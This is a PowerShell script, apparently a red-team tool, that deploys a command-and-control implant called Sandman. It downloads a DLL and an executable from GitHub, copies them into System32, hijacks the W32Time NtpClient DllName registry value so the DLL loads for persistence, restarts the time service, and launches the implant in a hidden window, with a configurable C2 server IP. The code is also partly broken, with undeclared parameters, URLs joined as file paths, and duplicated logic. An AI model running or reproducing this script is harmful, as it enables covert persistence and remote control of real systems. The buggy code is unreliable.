<#
.SYNOPSIS
    Sandman v2.0 - Auto Deploy & Run Script
.DESCRIPTION
    Downloads binaries from GitHub, moves to System32, registers DLL,
    restarts W32Time, and runs Sandman.exe
.NOTES
    Platform: Windows (PowerShell 5.1+)
#>

param(
    [Parameter(Mandatory = $false)]
    [string]$GitHubRepo = "https://github.com/ThePyroArsonist/RedTeamTools/tree/main/sandman/TimeProvider",

    [Parameter(Mandatory = $false)]
    [string]$TargetSystem32Path = "C:\Windows\system32",

    [Parameter(Mandatory = $false)]
    [string]$C2ServerIP = "10.10.10.50",

        [Parameter(Mandatory = $false)]
    [switch]$ShowVerbose,

    [Parameter(Mandatory = $false)]
    [switch]$QuietMode
)

function Log-Info{
    param($Message)
    
    if ($ShowVerbose -or $Verbose -ne "INFO") {
        $Timestamp = Get-Date -Format "HH:mm:ss"
        if ($QuietMode) {
            Write-Host "[$Timestamp] $Message" -ForegroundColor Gray
        } else {
            $Color = if ($Message -like "*INFO*") { "[INFO]" -f "Cyan" } `
                    elseif ($Message -like "*WARN*") { "[WARN]" -f "Yellow" } `
                    elseif ($Message -like "*ERROR*") { "[ERROR]" -f "Red" } `
                    elseif ($Message -like "*OK*") { "[OK]" -f "Green" } `
                    else { "[DEBUG]" -f "Magenta" }
            Write-Host "[$Timestamp] $Color $Message"
        }
    }
}


function Check-Admin{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
        Log-Info "Script requires Administrator privileges" -Level "ERROR"
        Write-Host "Please run PowerShell as Administrator"
        return $false
    }
    return $true
}

function Download-Binaries{
    param($GithubRepo, $OutputPath)
    
    $TimeProviderUrl = Join-Path $GithubRepo "TimeProvider.dll"
    $SandmanUrl = Join-Path $GithubRepo "Sandman.exe"
    
    $TimeProviderPath = Join-Path $OutputPath "TimeProvider.dll"
    $SandmanPath = Join-Path $OutputPath "Sandman.exe"
    
    # Create output folder
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Force -Path $OutputPath | Log
    }
    
    # Download TimeProvider.dll
    Log-Info "Downloading TimeProvider.dll..."
    try {
        Invoke-WebRequest -Uri $TimeProviderUrl -OutFile $TimeProviderPath -TimeoutSec 60
        Log-Info "Downloaded: $TimeProviderPath"
    } catch {
        Log-Info "Download failed: $_" -Level "WARN"
    }
    
    # Download Sandman.exe
    Log-Info "Downloading Sandman.exe..."
    try {
        Invoke-WebRequest -Uri $SandmanUrl -OutFile $SandmanPath -TimeoutSec 60
        Log-Info "Downloaded: $SandmanPath"
    } catch {
        Log-Info "Download failed: $_" -Level "WARN"
    }
    
    return $true
}

function Move-To-System32{
    param($SourcePath, $DestinationPath, $FileName)
    
    $Destination = Join-Path $DestinationPath $FileName
    if (Test-Path $Destination) {
        Log-Info "Backup: $Destination"
        $BackupPath = Join-Path $DestinationPath "$FileName.bak"
        Rename-Item -Path $Destination -NewName $BackupPath -Force
    }
    
    Move-Item -Path $SourcePath -Destination $Destination -Force
    Log-Info "Moved: $FileName to $Destination"
}

function Register-Dll{
    param($DllPath, $RegistryPath)
    
    # 1. Backup existing DllName
    $RegistryPath = Join-Path $RegistryPath "DllName"
    $BackupValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
    if ($BackupValue) {
        Log-Info "Backup: $RegistryPath = $($BackupValue.DllName)"
    }
    
    # 2. Set new DllName
    Log-Info "Setting DllName to: $DllPath"
    try {
        $null = reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" `
                      /v DllName /t REG_SZ /d "$DllPath" /f
        Log-Info "Registry updated successfully"
    } catch {
        Log-Info "Registry error: $_" -Level "ERROR"
    }
    
    # 3. Verify registry change
    $NewValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
    if ($NewValue -and $NewValue.DllName -eq $DllPath) {
        Log-Info "Registry verified successfully" -Level "OK"
    } else {
        Log-Info "Registry verification failed" -Level "WARN"
    }
}

function Restart-W32TimeService{
    param($ServiceName, $RestartCommand)
    
    Log-Info "Restarting $ServiceName service..."
    try {
        $null = & sc stop $ServiceName -Timeout 30
        Log-Info "Service stopped"
        
        $null = & sc start $ServiceName
        Log-Info "Service started"
        
        $Service = Get-Service -Name $ServiceName
        if ($Service.Status -eq "Running") {
            Log-Info "Service is now running" -Level "OK"
            return $true
        } else {
            Log-Info "Service status: $($Service.Status)" -Level "WARN"
            return $true
        }
    } catch {
        Log-Info "Service restart error: $_" -Level "ERROR"
        return $false
    }
}

function Run-Sandman{
    param($Executable, $Args)
    
    try {
        Log-Info "Starting $Executable..."
        
        # Create hidden process for stealth
        $Process = Start-Process -FilePath $Executable `
                                -ArgumentList $Args `
                                -WindowStyle Hidden `
                                -PassThru
        
        $ProcessId = $Process.Id
        Log-Info "Started: $Executable (PID: $ProcessId)"
        
        # Wait 5 seconds for initial response
        Start-Sleep -Seconds 5
        
        # Check if process is still running
        $Process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
        if ($Process -and $Process.MainModule) {
            Log-Info "Process is running: $($Process.MainModule.FileName)" -Level "OK"
        } else {
            Log-Info "Process may have exited" -Level "WARN"
        }
    } catch {
        Log-Info "Process start error: $_" -Level "ERROR"
    }
}

function Print-Banner{
    Write-Host @"
   _____                 _                       
  / ____|               | |                      
 | (___   __ _ _ __   __| |_ __ ___   __ _ _ __  
  \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
  ____) | (_| | | | | (_| | | | | | | (_| | | | |
 |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
        Sandman C2 Auto Deploy
"@
    Write-Host "        ============================="
}

function Print-Usage{
    Write-Host @"
Usage: .\Deploy-Sandman.ps1 [-Verbose] [-Quiet]

Examples:
  .\Deploy-Sandman.ps1                  # Default settings
  .\Deploy-Sandman.ps1 -Verbose         # Verbose logging
  .\Deploy-Sandman.ps1 -Quiet           # Silent mode
  .\Deploy-Sandman.ps1 -C2ServerIP 10.10.10.1  # Custom IP
"@
}

# === MAIN SCRIPT (Continued) ===
Log-Info "Starting Sandman Auto Deploy v2.0..."

# Check Admin
if (-not (Check-Admin)) {
    exit 1
}

Print-Banner

# Step 1: Download Binaries
Log-Info "Step 1: Downloading Binaries..."
$TimeProviderPath = Join-Path (Split-Path $GithubRepo) "TimeProvider.dll"
$SandmanPath = Join-Path (Split-Path $GithubRepo) "Sandman.exe"

$Downloaded = $false
if (Test-Path $TimeProviderPath) {
    $Downloaded = $true
    Log-Info "TimeProvider.dll exists: $TimeProviderPath"
} else {
    Log-Info "TimeProvider.dll not found, downloading from GitHub..."
    $GithubUrl = Join-Path $GithubRepo "TimeProvider.dll"
    $TempPath = Join-Path $env:TEMP "Temp_TimeProvider.dll"
    Invoke-WebRequest -Uri $GithubUrl -OutFile $TempPath -TimeoutSec 60
    Move-Item -Path $TempPath -Destination $TimeProviderPath -Force
    Log-Info "Downloaded and moved to: $TimeProviderPath"
}

if (Test-Path $SandmanPath) {
    $Downloaded = $true
    Log-Info "Sandman.exe exists: $SandmanPath"
} else {
    Log-Info "Sandman.exe not found, downloading from GitHub..."
    $GithubUrl = Join-Path $GithubRepo "Sandman.exe"
    $TempPath = Join-Path $env:TEMP "Temp_Sandman.exe"
    Invoke-WebRequest -Uri $GithubUrl -OutFile $TempPath -TimeoutSec 60
    Move-Item -Path $TempPath -Destination $SandmanPath -Force
    Log-Info "Downloaded and moved to: $SandmanPath"
}

if (-not $Downloaded) {
    Log-Info "Binaries download failed!" -Level "ERROR"
    exit 1
}

# Step 2: Move to System32
Log-Info "Step 2: Moving to System32..."
Move-To-System32 $TimeProviderPath $TargetSystem32Path "TimeProvider.dll"
Move-To-System32 $SandmanPath $TargetSystem32Path "Sandman.exe"

# Step 3: Register DLL
Log-Info "Step 3: Registering DLL in W32Time..."
$RegistryPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient"
$RegistryPath = Join-Path $RegistryPath "DllName"

# Backup existing DllName
$BackupValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
if ($BackupValue) {
    Log-Info "Backup: RegistryPath = $($BackupValue.DllName)"
}

# Set new DllName
Log-Info "Setting DllName to: $TimeProviderPath"
try {
    $null = reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" `
                  /v DllName /t REG_SZ /d "$TimeProviderPath" /f
    Log-Info "Registry updated successfully"
} catch {
    Log-Info "Registry error: $_" -Level "ERROR"
    exit 1
}

# Verify registry change
$NewValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
if ($NewValue -and $NewValue.DllName -eq $TimeProviderPath) {
    Log-Info "Registry verified successfully" -Level "OK"
} else {
    Log-Info "Registry verification failed" -Level "WARN"
}

# Step 4: Restart W32Time Service
Log-Info "Step 4: Restarting W32Time Service..."
$null = & sc stop "w32time" -Timeout 30
Log-Info "Service stopped"

$null = & sc start "w32time"
Log-Info "Service started"

$Service = Get-Service -Name "w32time"
if ($Service.Status -eq "Running") {
    Log-Info "Service is now running" -Level "OK"
} else {
    Log-Info "Service status: $($Service.Status)" -Level "WARN"
}

# Step 5: Run Sandman.exe
Log-Info "Step 5: Running Sandman.exe..."
$SandmanExecutable = Join-Path $TargetSystem32Path "Sandman.exe"

if (Test-Path $SandmanExecutable) {
    $Args = "--quiet"
    if ($Verbose) {
        $Args = " -v"
    }
    if ($Quiet) {
        $Args = " -q"
    }
    
    $Process = Start-Process -FilePath $SandmanExecutable `
                            -ArgumentList $Args `
                            -WindowStyle Hidden `
                            -PassThru
    
    $ProcessId = $Process.Id
    Log-Info "Started: Sandman.exe (PID: $ProcessId)"
    
    # Wait 5 seconds for initial response
    Start-Sleep -Seconds 5
    
    # Check if process is still running
    $Process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
    if ($Process -and $Process.MainModule) {
        Log-Info "Process is running: $($Process.MainModule.FileName)" -Level "OK"
    } else {
        Log-Info "Process may have exited" -Level "WARN"
    }
} else {
    Log-Info "Sandman.exe not found at: $SandmanExecutable" -Level "ERROR"
}

# Step 6: Print Summary
Log-Info "Step 6: Deployment Summary..."
Write-Host @"
   Deployment Complete!

   Registry Path: $RegistryPath
   DllName: $NewValue.DllName
   Service: w32time ($($Service.Status))
   Process: Sandman.exe (PID: $ProcessId)

"@

Log-Info "Deployment finished successfully!" -Level "OK"
